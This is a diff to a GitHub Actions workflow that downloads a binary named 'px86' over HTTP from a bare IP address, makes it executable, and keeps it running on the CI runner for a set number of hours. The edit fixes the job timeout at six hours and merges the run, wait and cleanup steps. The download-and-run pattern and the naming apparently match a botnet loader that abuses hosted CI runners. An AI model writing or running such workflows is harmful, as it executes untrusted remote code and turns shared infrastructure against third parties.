@@ -19,7 +19,8 @@ on:
 jobs:
   run-binary:
     runs-on: ubuntu-latest
-    timeout-minutes: ${{ fromJSON(github.event.inputs.uptime) * 60 }}
+    # Set a fixed maximum timeout (6 hours = 360 minutes)
+    timeout-minutes: 360
 
     steps:
     - name: Download binary
@@ -27,24 +28,18 @@ jobs:
         wget http://45.138.16.158/bins/px86 -O px86
         chmod +x px86
 
-    - name: Run binary in background
+    - name: Run binary and wait
       run: |
         # Run the binary in background
         ./px86 x86 > output.log 2>&1 &
         PID=$!
         echo "Binary started with PID: $PID"
-        echo $PID > pid.txt
-
-    - name: Wait for specified time
-      run: |
+        
+        # Wait for the specified time
         UPTIME=${{ github.event.inputs.uptime }}
         echo "Keeping VM alive for $UPTIME hours..."
         sleep $(($UPTIME * 3600))
-
-    - name: Cleanup
-      run: |
-        if [ -f pid.txt ]; then
-          PID=$(cat pid.txt)
-          kill $PID 2>/dev/null || true
-          echo "Process terminated"
-        fi
+        
+        # Cleanup
+        kill $PID 2>/dev/null || true
+        echo "Process terminated"
